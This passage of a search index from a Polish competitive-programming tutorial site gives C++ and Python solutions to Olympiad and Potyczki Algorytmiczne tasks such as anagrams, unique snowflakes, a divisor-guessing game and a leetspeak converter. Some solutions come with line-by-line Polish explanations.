True:\n    try:\n        line = input().split(\" \")\n    except EOFError:\n        break\n\n    passwordSize = int(line[0])\n    encodedMsg = line[1]\n    counters = dict()\n\n    currentStr = encodedMsg[0:passwordSize]\n    hash = 0\n    powerOf26 = 1\n\n    for i in range(passwordSize):\n        hash += (ord(currentStr[i]) - ord(\"a\") + 1) * powerOf26\n        powerOf26 *= 26\n\n    powerOf26 //= 26\n    counters[hash] = 1\n    currentCounter = 1\n    maxCounter = 1\n    password = currentStr\n\n    for i in range(1, len(encodedMsg) - passwordSize + 1):\n        hash -= ord(currentStr[0]) - ord(\"a\") + 1\n        currentStr = currentStr[1:]\n        currentStr += encodedMsg[i + passwordSize - 1]\n        hash //= 26\n        hash += (ord(currentStr[passwordSize - 1]) - ord(\"a\") + 1) * powerOf26\n        if hash in counters:\n            counters[hash] += 1\n        else:\n            counters[hash] = 1\n\n        currentCounter = counters[hash]\n        if currentCounter &gt; maxCounter:\n            maxCounter = currentCounter\n            password = currentStr\n\n    print(password)\n</code></pre>"},{"location":"algorithmic-exercises/level-3/slogan-learning-of-princess/","title":"Slogan Learning of Princess","text":"<p>Slogan Learning of Princess</p>"},{"location":"algorithmic-exercises/level-3/slogan-learning-of-princess/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/slogan-learning-of-princess/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/slogan-learning-of-princess/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/slogan-learning-of-princess/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n    string slogan1, slogan2;\n    map&lt;string, string&gt; slogans;\n\n    scanf(\"%d\", &amp;n);\n    getline(cin, slogan1);\n\n    for(int i = 0; i &lt; n; ++i) {\n        getline(cin, slogan1);\n        getline(cin, slogan2);\n        slogans[slogan1] = slogan2;\n    }\n\n    scanf(\"%d\", &amp;n);\n    getline(cin, slogan1);\n\n    for(int i = 0; i &lt; n; ++i) {\n        getline(cin, slogan1);\n        printf(\"%s\\n\", slogans[slogan1].c_str());\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/slogan-learning-of-princess/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>n = int(input())\n\nslogans = {input():input() for _ in range(n)}\n\nn = int(input())\n\nfor i in range(n):\n    slogan1 = input()\n    print(slogans[slogan1])\n</code></pre>"},{"location":"algorithmic-exercises/level-3/unique-snowflakes/","title":"Unique Snowflakes","text":"<p>Unique Snowflakes</p>"},{"location":"algorithmic-exercises/level-3/unique-snowflakes/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/unique-snowflakes/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/unique-snowflakes/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/unique-snowflakes/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main()\n{\n    unsigned int cases, n, maxSnowflakes, startIndex, index;\n    map&lt;unsigned int, unsigned int&gt; lastIndex;\n    vector&lt;unsigned int&gt; snowflakes;\n\n    scanf(\"%u\", &amp;cases);\n\n    for (int testCase = 1; testCase &lt;= cases; ++testCase)\n    {\n        scanf(\"%u\", &amp;n);\n\n        lastIndex.clear();\n        maxSnowflakes = 0;\n        startIndex = 1;\n        snowflakes = vector&lt;unsigned int&gt;(n);\n\n        for (int i = 1; i &lt;= n; i++)\n        {\n            scanf(\"%u\", &amp;snowflakes[i]);\n        }\n\n        for (int i = 1; i &lt;= n; i++)\n        {\n            index = lastIndex[snowflakes[i]];\n            if (index != 0)\n            {\n                while (startIndex &lt;= index)\n                {\n                    lastIndex[snowflakes[startIndex]] = 0;\n                    ++startIndex;\n                }\n            }\n\n            lastIndex[snowflakes[i]] = i;\n            maxSnowflakes = max(maxSnowflakes, i - startIndex + 1);\n        }\n\n        printf(\"%u\\n\", maxSnowflakes);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/unique-snowflakes/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>cases = int(input())\n\nfor _ in range(cases):\n    n = int(input())\n    lastIndex = dict()\n    maxSnowflakes = 0\n    startIndex = 0\n    snowflakes = [int(input()) for _ in range(n)]\n\n    for i in range(n):\n        if snowflakes[i] in lastIndex:\n            index = lastIndex[snowflakes[i]]\n            while startIndex &lt;= index:\n                lastIndex.pop(snowflakes[startIndex])\n                startIndex += 1\n\n        lastIndex[snowflakes[i]] = i\n        maxSnowflakes = max(maxSnowflakes, i - startIndex + 1)\n\n    print(maxSnowflakes)\n</code></pre>"},{"location":"algorithmic-exercises/level-3/word-index/","title":"Word Index","text":"<p>Word Index</p>"},{"location":"algorithmic-exercises/level-3/word-index/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/word-index/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/word-index/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/word-index/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nvoid computeWordsIndexes(string txt, int counter, char letter, int &amp;currentWordIndex, map&lt;string, int&gt; &amp;wordToIndex)\n{\n    if (letter &gt; 'z')\n    {\n        return;\n    }\n\n    string word;\n\n    if (counter == 1)\n    {\n        for (char c = letter; c &lt;= 'z'; ++c)\n        {\n            word = txt + c;\n            wordToIndex[word] = currentWordIndex;\n            currentWordIndex++;\n        }\n\n        return;\n    }\n\n    for (char c = letter; c &lt;= 'z'; ++c)\n    {\n        word = txt + c;\n        computeWordsIndexes(word, counter - 1, c + 1, currentWordIndex, wordToIndex);\n    }\n}\n\nint main()\n{\n    int currentWordIndex = 1;\n    string str;\n    map&lt;string, int&gt; wordToIndex;\n\n    for (int i = 1; i &lt;= 5; ++i)\n    {\n        computeWordsIndexes(\"\", i, 'a', currentWordIndex, wordToIndex);\n    }\n\n    while (cin &gt;&gt; str &amp;&amp; !cin.eof())\n    {\n        printf(\"%d\\n\", wordToIndex[str]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oi/","title":"Olimpiada Informatyczna","text":"<p>Om\u00f3wienia i rozwi\u0105zania wybranych zada\u0144 z Olimpiady Informatycznej.</p>"},{"location":"algorithmic-exercises/oi/anagramy/","title":"Anagramy","text":""},{"location":"algorithmic-exercises/oi/anagramy/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Anagramy</p>"},{"location":"algorithmic-exercises/oi/anagramy/#powiazane-algorytmy","title":"Powi\u0105zane algorytmy","text":"<ul> <li>Test anagram\u00f3w</li> <li>Sortowanie</li> </ul>"},{"location":"algorithmic-exercises/oi/anagramy/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oi/anagramy/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n#include &lt;set&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n    map&lt;string, set&lt;string&gt; &gt; anagramy;\n    map&lt;string, set&lt;string&gt; &gt; posortowane_anagramy;\n    string wyraz, posortowany;\n\n    cin &gt;&gt; n;\n\n    for(int i = 0; i &lt; n; i++) {\n        cin &gt;&gt; wyraz;\n        posortowany = wyraz;\n        sort(posortowany.begin(), posortowany.end());\n        anagramy[posortowany].insert(wyraz);\n    }\n\n    for(auto el : anagramy) {\n        posortowane_anagramy[*el.second.begin()] = el.second;\n    }\n\n    for(auto el : posortowane_anagramy) {\n        for(auto w : el.second) {\n            cout &lt;&lt; w &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oi/anagramy/python/","title":"Python","text":""},{"location":"algorithmic-exercises/oi/anagramy/python/#implementacja","title":"Implementacja","text":"<pre><code>anagrams = dict()\nanagramsSorted = dict()\n\nn = int(input())\n\nfor i in range(n):\n    word = input()\n    wordSorted = \"\".join(sorted(word))\n\n    if wordSorted in anagrams:\n        anagrams[wordSorted].add(word)\n    else:\n        anagrams[wordSorted] = {word}\n\nfor key in anagrams:\n    valueSorted = sorted(anagrams[key])\n    anagramsSorted[valueSorted[0]] = valueSorted\n\nfor key in sorted(anagramsSorted):\n    for word in anagramsSorted[key]:\n        print(word, end = \" \")\n\n    print()\n</code></pre>"},{"location":"algorithmic-exercises/oi/gra-w-dzielniki/","title":"Minusy","text":""},{"location":"algorithmic-exercises/oi/gra-w-dzielniki/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Gra w dzielniki</p>"},{"location":"algorithmic-exercises/oi/gra-w-dzielniki/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oi/gra-w-dzielniki/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include \"maja.h\"\n\nvoid resetuj(bool kandydaci[]) {\n    for(int i = 0; i &lt;= 1000000; i++) {\n        kandydaci[i] = true;\n    }\n}\n\nvoid odznaczNiep(bool kandydaci[], int wiel) {\n    for(int i = wiel; i &lt;= 1000000; i += wiel) {\n        kandydaci[i] = false;\n    }\n}\n\nvoid odznaczPodz(bool kandydaci[], int wiel) {\n    for(int i = 1; i &lt;= 1000000; i++) {\n        if(i % wiel != 0) {\n            kandydaci[i] = false;\n        } \n    }\n}\n\nint main() {\n    int n;\n    bool kandydaci[1000001];\n\n    n = gramy_dalej();\n\n    while(n != 0) {\n        resetuj(kandydaci);\n\n        for(int i = 2; i &lt;= n; i++) {\n            if(kandydaci[i]) {\n                if(!czy_podzielna_przez(i)) {\n                    odznaczNiep(kandydaci, i);\n                } else {\n                    odznaczPodz(kandydaci, i);\n                }\n            }\n        }\n\n        for(int i = 1; i &lt;= n; i++) {\n            if(kandydaci[i]) {\n                zgaduj(i);\n                break;\n            }\n        }\n\n        n = gramy_dalej();\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oi/gra-w-dzielniki/c%2B%2B/#opis","title":"Opis","text":"<p>Funkcja <code>resetuj</code> wype\u0142nia tablic\u0119 <code>kandydaci</code> warto\u015bciami <code>true</code>.</p> <p>Funkcja <code>odznaczNiep</code> skre\u015bla z tablicy wszystkie wielokrotno\u015bci podanej warto\u015bci <code>wiel</code>.</p> <p>Funkcja <code>odznaczPodz</code> skre\u015bla z tablicy wszystkie liczby, kt\u00f3re nie s\u0105 wielokrotno\u015bci\u0105 podanej warto\u015bci <code>wiel</code>.</p> <p>W tablicy <code>kandydaci</code> przechowujemy informacje na temat potencjalnych warto\u015bci, o kt\u00f3rych mog\u0142a pomy\u015ble\u0107 Maja. Je\u017celi pod indeksem \\(i\\) w tablicy znajduje si\u0119 warto\u015b\u0107 <code>true</code>, to znaczy \u017ce liczba \\(i\\) mo\u017ce wci\u0105\u017c by\u0107 prawid\u0142ow\u0105 odpowiedzi\u0105. Je\u017celi natomiast pod indeksem \\(i\\) znajduje si\u0119 warto\u015b\u0107 <code>false</code>, oznacza to, \u017ce liczba \\(i\\) zosta\u0142a skre\u015blona, wi\u0119c wiemy ju\u017c, \u017ce nie jest prawid\u0142ow\u0105 odpowiedzi\u0105.</p> <p>Na pocz\u0105tku dzia\u0142ania programu wywo\u0142ujemy funkcj\u0119 <code>gramy_dalej</code>, kt\u00f3rej wynik zapisujemy w zmiennej <code>n</code>, w ten spos\u00f3b poznaj\u0105c g\u00f3rne ograniczenie dla zgadywanej warto\u015bci. Nast\u0119pnie w p\u0119tli powtarzamy operacje tak d\u0142ugo, a\u017c otrzymamy \\(n=0\\), co oznacza koniec danych wej\u015bciowych. Na pocz\u0105tku p\u0119tli, przed przyst\u0105pieniem do odpytywania o podzielno\u015b\u0107, resetujemy tablic\u0119 kandydat\u00f3w (linia 31), korzystaj\u0105c z pomocniczej funkcji <code>resetuj</code>. Nast\u0119pnie przechodzimy przez wszystkie warto\u015bci od \\(2\\) do g\u00f3rnego ograniczenia przedzia\u0142u \\(n\\) w\u0142\u0105cznie (linia 33). Dla ka\u017cdej warto\u015bci sprawdzamy, czy nie zosta\u0142a ona jeszcze skre\u015blona w tablicy kandydat\u00f3w, to znaczy czy mo\u017ce by\u0107 poprawn\u0105 odpowiedzi\u0105 (linia 34). Je\u017celi tak jest, to odpytujemy o podzielno\u015b\u0107 przez t\u0119 w\u0142a\u015bnie liczb\u0119 za pomoc\u0105 funkcji <code>czy_podzielna_przez</code> (linia 35).  Je\u017celi szukana liczba nie jest podzielna przez \\(i\\) to w tablicy kandydat\u00f3w skre\u015blamy wszystkie wielokrotno\u015bci \\(i\\) (linia 36) korzystaj\u0105c z pomocniczej funkcji <code>odznaczNiep</code>. W przeciwnym przypadku, tzn. gdy szukana warto\u015b\u0107 jest podzielna przez \\(i\\) to skre\u015blamy wszystkie warto\u015bci niepodzielne przez \\(i\\) (linia 38) za pomoc\u0105 pomocniczej funkcji <code>odznaczPodz</code>.</p> <p>Gdy ju\u017c przejdziemy przez wszystkie warto\u015bci ze sprawdzanego zakresu i zadamy wszystkie sensowne pytania o podzielno\u015b\u0107, mo\u017cemy przyst\u0105pi\u0107 do odgadni\u0119cia szukanej liczby. W tym celu musimy znale\u017a\u0107 w tablicy kandydat\u00f3w warto\u015b\u0107, kt\u00f3ra nie zosta\u0142a jeszcze skre\u015blona. Przechodzimy wi\u0119c p\u0119tl\u0105 przez wszystkie potencjalne warto\u015bci od \\(1\\) do \\(n\\) w\u0142\u0105cznie (linia 43) i dla ka\u017cdej sprawdzamy, czy nie zosta\u0142a ona skre\u015blona (linia 44). Gdy znajdziemy tak\u0105 warto\u015b\u0107, dokonujemy pr\u00f3by odgadni\u0119cia (linia 45) i wychodzimy z p\u0119tli ( linia 46).</p> <p>Na koniec rozpoczynamy kolejn\u0105 rozgrywk\u0119 za pomoc\u0105 funkcji <code>gramy_dalej</code> pobieraj\u0105c g\u00f3rne ograniczenie przedzia\u0142u (linia 51).</p>"},{"location":"algorithmic-exercises/oi/gra-w-minima/","title":"Gra w minima","text":""},{"location":"algorithmic-exercises/oi/gra-w-minima/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Gra w minima</p>"},{"location":"algorithmic-exercises/oi/gra-w-minima/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oi/gra-w-minima/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;algorithm&gt;\n#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n    int result = 0;\n\n    scanf(\"%d\", &amp;n); \n\n    int cards[n];\n\n    for (int i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;cards[i]);\n    }\n\n    sort(cards, cards + n);\n\n    for(auto el: cards) {\n        result = max(result, el - result);\n    }\n\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oi/minusy/","title":"Minusy","text":""},{"location":"algorithmic-exercises/oi/minusy/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Minusy</p>"},{"location":"algorithmic-exercises/oi/minusy/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oi/minusy/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n    char sign;\n    bool plus = false;\n\n    scanf(\"%d\", &amp;n);\n\n    for(int i = 0; i &lt; n - 1; i++) {\n        cin &gt;&gt; sign;\n        if (sign == '-' &amp;&amp; plus) {\n            printf(\")\");\n            plus = false;\n        } else if (sign == '+' &amp;&amp; !plus){\n            printf(\"(\");\n            plus = true;\n        }\n\n        printf(\"-\");\n    }\n\n    if (plus) {\n        printf(\")\");\n    }\n\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oi/minusy/python/","title":"Python","text":"<p>Warning</p> <p>Uwaga</p> <p>Chocia\u017c rozwi\u0105zanie jest stosunkowo proste, to Python jest niestety zbyt wolny do tego zadania, dlatego w niekt\u00f3rych testach zostanie przekroczony limit czasu.</p>"},{"location":"algorithmic-exercises/oi/minusy/python/#implementacja","title":"Implementacja","text":"<pre><code>plus = False\nresult = \"\"\nn = int(input())\n\nfor _ in range(n - 1):\n    sign = input()\n\n    if sign == \"-\" and plus:\n        result += \")\"\n        plus = False\n    elif sign == \"+\" and not plus:\n        result += \"(\"\n        plus = True\n\n    result += \"-\"\n\nif plus:\n    result += \")\"\n\nprint(result)\n</code></pre>"},{"location":"algorithmic-exercises/oi/minusy/python/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku tworzymy zmienn\u0105 <code>plus</code> do zapami\u0119tania, czy ostatni wczytany symbol by\u0142 znakiem dodawania (linia 1). Definiujemy tak\u017ce zmienn\u0105 <code>result</code> do przechowywania wyniku (linia 2). Nast\u0119pnie wczytujemy liczb\u0119 znak\u00f3w do zmiennej <code>n</code> (linia 3). </p> <p>W kolejnym kroku przechodzimy p\u0119tl\u0105 przez \\(n-1\\) znak\u00f3w (linia 5). W p\u0119tli wczytujemy kolejny znak do zmiennej <code>sign</code> (linia 6). Nast\u0119pnie sprawdzamy, czy obecny znak to minus, a poprzedni by\u0142 plusem (linia 8). Je\u017celi tak, to dodajemy nawias zamykaj\u0105cy do wyniku (linia 9) i zapami\u0119tujemy, \u017ce ostatni znak nie by\u0142 plusem (linia 10). W przeciwnym przypadku sprawdzamy, czy obecny znak to plus i poprzedni nie by\u0142 plusem (linia 11). Je\u017celi tak, to dodajemy otwieraj\u0105cy nawias do wyniku (linia 12) i zapami\u0119tujemy, \u017ce ostatni znak by\u0142 plusem. (linia 13) Na koniec p\u0119tli dopisujemy znak odejmowania do wyniku (linia 15).</p> <p>Po wyj\u015bciu z p\u0119tli sprawdzamy, czy ostatni znak by\u0142 znakiem dodawania (linia 17). Je\u017celi tak, to dopisujemy do wyniku nawias zamykaj\u0105cy (linia 18). Na koniec programu wypisujemy wynik na ekranie (linia 20).</p>"},{"location":"algorithmic-exercises/oig/","title":"Olimpiada Informatyczna Junior\u00f3w","text":"<p>Om\u00f3wienia i rozwi\u0105zania wybranych zada\u0144 z Olimpiady Informatycznej Junior\u00f3w.</p>"},{"location":"algorithmic-exercises/oig/albo-psikus/","title":"... albo psikus!","text":""},{"location":"algorithmic-exercises/oig/albo-psikus/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>... albo psikus!</p>"},{"location":"algorithmic-exercises/oig/albo-psikus/#powiazane-algorytmy","title":"Powi\u0105zane algorytmy","text":"<ul> <li>Sumy prefiksowe</li> </ul>"},{"location":"algorithmic-exercises/oig/albo-psikus/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/albo-psikus/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdio&gt;\n\nusing namespace std;\n\nint main() {\n    int n, oddCount = 0, evenCount = 0, c;\n    unsigned long long int sum = 0, result = 0;\n\n    scanf(\"%d\", &amp;n);\n\n    for(int i = 1; i &lt;= n; i++) {\n        scanf(\"%d\", &amp;c);\n        sum += c;\n        if (sum % 2 == 0) {\n            evenCount++;\n            result += evenCount;\n        } else {\n            result += oddCount;\n            oddCount++;\n        }\n    }\n\n    printf(\"%llu\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oig/albo-psikus/python/","title":"Python","text":""},{"location":"algorithmic-exercises/oig/albo-psikus/python/#implementacja","title":"Implementacja","text":"<pre><code>n = int(input())\nnumbers = list(map(int, input().split()))\n\nsum = 0\noddCount = 0\nevenCount = 0\nresult = 0\n\nfor num in numbers:\n    sum += num\n    if sum % 2 == 0:\n        evenCount += 1\n        result += evenCount\n    else:\n        result += oddCount\n        oddCount += 1\n\nprint(result)\n</code></pre>"},{"location":"algorithmic-exercises/oig/basen/","title":"Basen","text":""},{"location":"algorithmic-exercises/oig/basen/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Basen</p>"},{"location":"algorithmic-exercises/oig/basen/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/basen/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n\nint sign(int number) {\n    if(number &lt; 0) {\n        return -1;\n    } else if(number &gt; 0) {\n        return 1;\n    } else {\n        return 0;\n    }\n}\n\nint main() {\n    int n, result = 1, lastSign = 0, currentSign;\n\n    scanf(\"%d\", &amp;n);\n\n    int tab[n];\n\n    for(int i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;tab[i]);\n    }\n\n    if (n &gt; 1) {\n        lastSign = sign(tab[1] - tab[0]);\n        if(lastSign == -1) {\n            result++;\n        }\n    }\n\n    for(int i = 2; i &lt; n; i++) {\n        currentSign = sign(tab[i] - tab[i - 1]);\n        if (lastSign == 0) {\n            lastSign = currentSign;\n            if(lastSign == -1) {\n                result++;\n            }\n        }\n\n        if (currentSign != 0 &amp;&amp; currentSign != lastSign) {\n            result++;\n            lastSign = currentSign;\n        }\n    }\n\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oig/bierki/","title":"Bierki","text":""},{"location":"algorithmic-exercises/oig/bierki/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Bierki</p>"},{"location":"algorithmic-exercises/oig/bierki/#powiazane-algorytmy","title":"Powi\u0105zane algorytmy","text":"<ul> <li>Algorytm g\u0105sienicy</li> </ul>"},{"location":"algorithmic-exercises/oig/bierki/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/bierki/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    int liczbaBierek, ogon, glowa;\n    int min1, min2, max, wynik, dlugosc;\n\n    scanf(\"%d\", &amp;liczbaBierek);\n\n    int bierki[liczbaBierek];\n\n    for(int i = 0; i &lt; liczbaBierek; i++) {\n        scanf(\"%d\", &amp;bierki[i]);\n    }\n\n    sort(bierki, bierki + liczbaBierek);\n\n    ogon = 0;\n    glowa = 2;\n    wynik = 0;\n\n    while(glowa &lt; liczbaBierek) {\n        dlugosc = glowa - ogon + 1;\n\n        if(dlugosc &lt; 3) {\n            glowa++;\n            continue;\n        }\n\n        min1 = bierki[ogon];\n        min2 = bierki[ogon + 1];\n        max = bierki[glowa];\n\n        if (min1 + min2 &lt;= max) {\n            ogon++;\n        } else {\n            if(dlugosc &gt; wynik) {\n                wynik = dlugosc;\n            }\n\n            glowa++;\n        }\n    }\n\n    printf(\"%d\\n\", wynik);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oig/bierki/python/","title":"Python","text":""},{"location":"algorithmic-exercises/oig/bierki/python/#implementacja","title":"Implementacja","text":"<pre><code>liczbaBierek = int(input())\n\nbierki = [int(input()) for _ in range(liczbaBierek)]\n\nbierki = sorted(bierki)\n\nogon = 0\nglowa = 2\nwynik = 0\n\nwhile glowa &lt; liczbaBierek:\n    dlugosc = glowa - ogon + 1\n\n    if dlugosc &lt; 3:\n        glowa += 1\n        continue\n\n    min1 = bierki[ogon]\n    min2 = bierki[ogon + 1]\n    mx = bierki[glowa]\n\n    if min1 + min2 &lt;= mx:\n        ogon += 1\n    else:\n        if dlugosc &gt; wynik:\n            wynik = dlugosc\n\n        glowa += 1\n\nprint(wynik)\n</code></pre>"},{"location":"algorithmic-exercises/oig/h4x0r/","title":"H4x0r","text":""},{"location":"algorithmic-exercises/oig/h4x0r/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>H4x0r</p>"},{"location":"algorithmic-exercises/oig/h4x0r/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/h4x0r/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    string txt;\n\n    cin &gt;&gt; txt;\n\n    for(int i = 0; i &lt; txt.length(); i++) {\n        switch (txt[i]) {\n            case 'a':\n                txt[i] = '4';\n                break;\n            case 'e':\n                txt[i] = '3';\n                break;\n            case 'i':\n                txt[i] = '1';\n                break;\n            case 'o':\n                txt[i] = '0';\n                break;\n            case 's':\n                txt[i] = '5';\n                break;\n            default:\n                break;\n        }\n    }\n\n    cout &lt;&lt; txt &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oig/h4x0r/python/","title":"Python","text":""},{"location":"algorithmic-exercises/oig/h4x0r/python/#implementacja","title":"Implementacja","text":"<pre><code>txt = input()\ntxt = txt.replace(\"a\", \"4\")\ntxt = txt.replace(\"e\", \"3\")\ntxt = txt.replace(\"i\", \"1\")\ntxt = txt.replace(\"o\", \"0\")\ntxt = txt.replace(\"s\", \"5\")\nprint(txt)\n</code></pre>"},{"location":"algorithmic-exercises/oig/skarpetki/","title":"Skarpetki","text":""},{"location":"algorithmic-exercises/oig/skarpetki/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Skarpetki</p>"},{"location":"algorithmic-exercises/oig/skarpetki/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/skarpetki/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    string socks;\n    int b = 0, c = 0, result;\n\n    cin &gt;&gt; socks;\n\n    for(int i = 0; i &lt; socks.length(); i++) {\n        if (socks[i] == 'B') {\n            b++;\n        } else {\n            c++;\n        }\n    }\n\n    result = (b / 2) + (c / 2);\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oig/wynik-meczu/","title":"Wynik meczu","text":""},{"location":"algorithmic-exercises/oig/wynik-meczu/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Wynik meczu</p>"},{"location":"algorithmic-exercises/oig/wynik-meczu/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/wynik-meczu/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdio&gt;\n\nusing namespace std;\n\nint main() {\n    string results;\n    int a = 0, b = 0;\n\n    cin &gt;&gt; results;\n\n    for(int i = 0; i &lt; results.length(); i++) {\n        if (results[i] == 'A') {\n            a++;\n        } else {\n            b++;\n        }\n    }\n\n    printf(\"%d : %d\\n\", a, b);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/oig/zmiennoliterowe-slowo/","title":"Zmiennoliterowe s\u0142owo","text":""},{"location":"algorithmic-exercises/oig/zmiennoliterowe-slowo/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Zmiennoliterowe s\u0142owo</p>"},{"location":"algorithmic-exercises/oig/zmiennoliterowe-slowo/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/oig/zmiennoliterowe-slowo/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    string word;\n    int result = 0;\n\n    cin &gt;&gt; word;\n\n    for(int i = 1; i &lt; word.length(); i++) {\n        if (word[i] == word[i - 1]) {\n            result++;\n        }\n    }\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/potyczki-algorytmiczne/","title":"Potyczki Algorytmiczne","text":"<p>Om\u00f3wienia i rozwi\u0105zania wybranych zada\u0144 z Potyczek Algorytmicznych.</p>"},{"location":"algorithmic-exercises/potyczki-algorytmiczne/apb/","title":"A + B","text":""},{"location":"algorithmic-exercises/potyczki-algorytmiczne/apb/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>A + B</p>"},{"location":"algorithmic-exercises/potyczki-algorytmiczne/apb/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/potyczki-algorytmiczne/apb/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdio&gt;\n\nusing namespace std;\n\nint main() {\n    string number;\n    unsigned long long int result = 0, first, second;\n\n    unsigned long currentDigit, previousDigit, twoDigits;\n\n    first = 1;\n\n    cin &gt;&gt; number;\n\n    result = number[0] - '0' + 1;\n    second = result;\n\n    for(int i = 1; i &lt; number.length(); i++) {\n        currentDigit = number[i] - '0';\n        previousDigit = number[i - 1] - '0';\n\n        result = currentDigit + 1;\n        result *= second;\n\n        if (previousDigit == 1) {\n            result += (9 - currentDigit) * first;\n        }\n\n        first = second;\n        second = result;\n    }\n\n    printf(\"%llu\\n\", result);\n\n    return 